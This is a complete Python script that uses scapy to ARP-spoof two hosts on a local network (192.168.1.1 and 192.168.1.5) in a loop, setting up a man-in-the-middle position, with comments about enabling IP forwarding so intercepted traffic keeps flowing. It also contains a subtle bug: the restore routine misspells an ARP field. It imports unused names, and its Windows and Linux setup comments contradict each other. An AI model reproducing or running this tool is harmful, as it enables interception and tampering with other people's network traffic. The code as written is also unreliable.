#!/usr/bin/python

# Requires WinPCap
# Enable IP forwarding
# echo 1 > /proc/sys/net/ipv4/ip_forward
# arp -a to confirm

from socket import timeout
from tabnanny import verbose
import scapy.all as scapy

def restore(dest_ip, src_ip):
    target_mac = get_target_mac(dest_ip)
    src_mac = get_target_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=target_mac, prsrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, verbose=False)


def get_target_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
    finalpacket = broadcast/arp_req
    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return(mac)

def spoof_arp(target_ip, spoofed_ip):
    mac = get_target_mac(target_ip)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)


def main():
    try:
        while True:
            spoof_arp("192.168.1.1","192.168.1.5")
            spoof_arp("192.168.1.5","192.168.1.1")
    except KeyboardInterrupt:
        restore("192.168.1.1", "192.168.1.5")
        restore("192.168.1.5", "192.168.1.1")
        exit(0)

main()